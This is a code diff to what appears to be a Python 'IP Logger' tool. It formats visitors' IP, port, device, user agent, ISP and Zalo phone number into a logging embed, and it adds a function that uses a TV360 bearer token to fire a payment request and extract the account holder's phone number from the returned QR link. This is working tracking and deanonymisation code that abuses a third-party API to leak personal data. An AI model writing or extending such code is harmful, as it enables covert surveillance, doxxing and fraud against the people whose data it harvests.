@@ -11,6 +11,7 @@ from Crypto.Cipher import AES
 import base64
 from urllib.parse import unquote
 from Crypto.Util.Padding import pad, unpad
+from urllib.parse import urlparse, parse_qs
 import json
 import hashlib
 import binascii
@@ -142,7 +143,7 @@ def generate_random_string(length):
 
     return random_string
 def export_data(ip_info, created_at ,ip, port, os , browser, useragent, filename, token, url_thumnail, type ,id, zalo=None):
-    info=  f"1. IP: {ip}: {port}, Time: {created_at} \n2. Khu vực: {ip_info['city']} - {ip_info['regionName']} - {ip_info['country']}\n3. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Phone:{zalo}"
+    info=  f"1. IP: {ip} - port: {port}, Time: {created_at} \n2. Thông tin thiết bị: user_agent:{useragent} - device: {os}-{browser}\n4. Nhà cung cấp dịch vụ: {ip_info['isp']}\n5. Phone:{zalo}"
     embed = {
         "username": "IP Logger",
         "avatar_url": url_thumnail,
@@ -245,12 +246,12 @@ def checkinfo(t_md, ZCID, networktype, operator, useragent='', viewerkey=None):
             return f' Loại thiết bị Apple - Mạng: LTE - UID: {uid}'
         if useragent and 'network' in useragent:
             return f' Loại thiết bị Apple - network: {networktype} - UID: {uid}'
-        if useragent and 'zalo' in useragent:
+        if useragent and 'ZaloPC' in useragent:
             return f'Zalo PC - network: {networktype} - UID: {uid} - t_md: {t_md}'
     else:
         if useragent and 'network' in useragent:
             return ' Loại thiết bị Apple'
-        if useragent and 'zalo' in useragent:
+        if useragent and 'ZaloPC' in useragent:
                 return 'Zalo PC'
     return 'Trình duyệt' if useragent and 'Mozilla' in useragent else 'Thiết bị không xác định'
 
@@ -259,8 +260,41 @@ def get_operator(mnc):
         '45201': 'Mobifone',
         '45202': 'Vinaphone',
         '45204': 'Viettel',
-        '45205': 'Vietnamobile'
+        '45205': 'Vietnamobile',
+        '-1': 'Không xác định'
     }
     return switcher.get(mnc, mnc)
+    
+def Get_phone_number_viettel(token_tv360: str):
+    # API request
+    url = 'https://api.tv360.vn/api/v1/payment/request-v2'
+    payload = {
+        "packageId": "1101",
+        "paymentMethodId": "4"
+    }
+    headers = {
+        'Authorization': f"Bearer {token_tv360}",
+        'Content-Type': 'application/json; charset=UTF-8',
+        'Host': 'api.tv360.vn',
+        'osapptype': 'ANDROID'
+    }
+    try:
+        response = requests.post(url, json=payload, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        response_data = response.json()
+        # Extract phone number
+        if response_data and 'data' in response_data and 'bindingQrLink' in response_data['data']:
+            binding_qr_link = response_data['data']['bindingQrLink']
+            url_parts = urlparse(binding_qr_link)
+            query = parse_qs(url_parts.query)
+            if 'login_msisdn' in query:
+                return query['login_msisdn'][0]
+            else:
+                print('login_msisdn not found')
+        else:
+            print('bindingQrLink not found')
+
+    except requests.RequestException as e:
+        print(f"An error occurred: {e}")
     
 
